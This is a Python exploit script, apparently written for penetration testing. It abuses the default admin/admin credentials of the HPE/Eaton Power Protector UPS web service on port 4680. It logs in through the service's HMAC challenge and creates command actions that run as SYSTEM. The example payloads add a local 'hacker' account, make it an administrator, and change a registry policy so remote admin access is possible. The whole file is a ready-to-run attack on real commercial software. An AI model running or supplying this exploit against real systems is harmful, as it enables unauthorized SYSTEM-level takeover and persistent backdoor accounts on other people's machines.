#! /usr/bin/env python3
'''
	Copyright 2026 Pentastic

        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program.  If not, see <http://www.gnu.org/licenses/>.

        This script abuses a common misconfiguration of the HPE / Eaton Power Protector UPS software.
        It installs and runs a web service on port 4680 with default admin/admin credentials.
        The service runs as SYSTEM and allows you to execute commands in that context using the command actions. 
        
        This should work on Linux using Python3
'''

import requests
import hashlib
import hmac
import json
import warnings

warnings.filterwarnings("ignore", message="Unverified HTTPS request")

# Parameters

BASE_URL = "https://192.168.1.1:4680"
USERNAME = "admin"
PASSWORD = "admin"

# Actions to create

ACTIONS = [
    {"name": "adduser", "command": "net user hacker SetThisFirst! /add"},
    {"name": "makeadmin", "command": "net localgroup administrators hacker /add"},
    {"name": "modifyreg", "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"}
]

# Authentication

def sha1_hex(data: str) -> str:
    return hashlib.sha1(data.encode("ascii")).hexdigest()


def compute_password(password: str, challenge: str) -> str:
    inner = sha1_hex(password)
    return hmac.new(
        inner.encode("ascii"),
        challenge.encode("ascii"),
        hashlib.sha1
    ).hexdigest()


def get_challenge(session: requests.Session) -> str:
    url = f"{BASE_URL}/server/user_srv.js?action=queryLoginChallenge"

    session.cookies.set("UserSettings", "language=1")
    session.cookies.set("mc2LastLogin", USERNAME)
    session.cookies.set("sessionID", "0")

    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Referer": f"{BASE_URL}/",
        "Origin": BASE_URL,
    }

    response = session.post(url, data="sessionID=0", headers=headers, verify=False)
    response.raise_for_status()
    return response.json()["challenge"]


def login(session: requests.Session, challenge: str) -> str:
    url = f"{BASE_URL}/server/user_srv.js?action=loginUser"

    final_hash = compute_password(PASSWORD, challenge)
    print("Computed login hash:", final_hash)

    body = f"login={USERNAME}&password={final_hash}&sessionID=0"

    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Referer": f"{BASE_URL}/",
        "Origin": BASE_URL,
    }

    response = session.post(url, data=body, headers=headers, verify=False)
    print("Login response:", response.text)
    response.raise_for_status()

    data = response.json()
    if not data.get("success"):
        raise Exception(f"Login failed: {response.text}")

    session_id = data["sessionID"]
    session.cookies.set("sessionID", session_id)
    return session_id

# Action handling

def create_action(session: requests.Session, session_id: str, name: str, command: str):
    url = f"{BASE_URL}/server/action_srv.js?action=addAction"

    descriptor = {
        "active": True,
        "name": name,
        "action": "execScript",
        "params": {"command": command},
        "criticality": "1",
        "categories": ["#all"],
        "views": ["views"]
    }

    body = "descriptor=" + requests.utils.quote(json.dumps(descriptor)) + f"&sessionID={session_id}"

    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Referer": f"{BASE_URL}/",
        "Origin": BASE_URL,
    }

    response = session.post(url, data=body, headers=headers, verify=False)
    response.raise_for_status()
    print(f"Created action '{name}': {response.text}")


def test_action(session: requests.Session, session_id: str, name: str):
    url_list = f"{BASE_URL}/server/action_srv.js?action=loadActionList"
    body_list = f"sessionID={session_id}"
    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Referer": f"{BASE_URL}/",
        "Origin": BASE_URL,
    }

    response = session.post(url_list, data=body_list, headers=headers, verify=False)
    response.raise_for_status()
    actions = response.json()

    action_id = None
    for aid, descriptor in actions:
        if descriptor.get("name") == name:
            action_id = aid
            break

    if not action_id:
        print(f"Could not find action ID for '{name}', skipping test.")
        return

    run_test = input(f"Run test for action '{name}'? (y/n): ").strip().lower()
    if run_test != "y":
        print(f"Skipped test for '{name}'.")
        return

    url_test = f"{BASE_URL}/server/action_srv.js?action=testAction"
    body_test = f"actionID={action_id}&sessionID={session_id}"

    response = session.post(url_test, data=body_test, headers=headers, verify=False)
    response.raise_for_status()
    print(f"Test response for '{name}': {response.text}")


def delete_action(session: requests.Session, session_id: str, name: str):
    url_list = f"{BASE_URL}/server/action_srv.js?action=loadActionList"
    body_list = f"sessionID={session_id}"
    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Referer": f"{BASE_URL}/",
        "Origin": BASE_URL,
    }

    response = session.post(url_list, data=body_list, headers=headers, verify=False)
    response.raise_for_status()
    actions = response.json()

    for aid, descriptor in actions:
        if descriptor.get("name") == name:
            url_remove = f"{BASE_URL}/server/action_srv.js?action=removeAction"
            body_remove = f"actionID={aid}&sessionID={session_id}"
            resp_remove = session.post(url_remove, data=body_remove, headers=headers, verify=False)
            resp_remove.raise_for_status()
            print(f"Deleted action '{name}': {resp_remove.text}")

# Main

def main():
    with requests.Session() as session:
        challenge = get_challenge(session)
        print("Challenge:", challenge)

        session_id = login(session, challenge)
        print("Session ID:", session_id)

        for action in ACTIONS:
            create_action(session, session_id, action["name"], action["command"])

        for action in ACTIONS:
            test_action(session, session_id, action["name"])

        delete_prompt = input("\nDelete all added actions? (y/n): ").strip().lower()
        if delete_prompt == "y":
            for action in ACTIONS:
                delete_action(session, session_id, action["name"])
        else:
            print("Skipped deleting actions.")


if __name__ == "__main__":
    main()

